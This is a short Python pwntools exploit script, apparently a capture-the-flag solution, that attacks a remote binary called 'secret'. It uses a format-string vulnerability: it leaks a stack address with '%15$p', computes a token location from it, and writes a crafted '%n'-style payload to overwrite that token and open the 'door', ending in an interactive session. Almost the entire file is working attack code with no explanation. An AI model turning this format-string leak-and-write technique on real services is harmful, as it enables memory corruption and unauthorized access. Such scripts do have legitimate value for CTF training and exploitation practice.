#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./secret"
elf = ELF(pwn_file)
if debug == 1:
    c = process(pwn_file)
else:
    c = remote('140.110.112.77', 6131)

context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug == 1:
    gdbcmd = '''
    '''

    #gdb.attach(c, gdbcmd)
    #context.log_level ='debug'


# leak
for i in range(0):
    c.sendlineafter("key :",flat({0: '%{}$p'.format(i)}, length=0x10))
    c.recvuntil('key is ')
    print(i, c.recvline())
    c.sendlineafter("N)", 'N')


c.sendlineafter("key :", '%15$p')
c.recvuntil('key is ')
rbp = int(c.recvline()[:-1] , 16) - 0xe8
c.sendlineafter("N)", 'N')


token_addr = rbp - 0xc + 8

#input()
p = pwnlib.fmtstr.make_payload_dollar(10, [pwnlib.fmtstr.AtomWrite(token_addr, 0x1, 0x37)])
p = flat({0: p[0], 0x10: p[1]})
print(p)
c.sendlineafter("key :",p)
c.sendlineafter("N)", 'Y')

#print(c.recvuntil('Door open. OwO'))
#print(c.recvuntil('}'))

c.interactive()
#c.close()

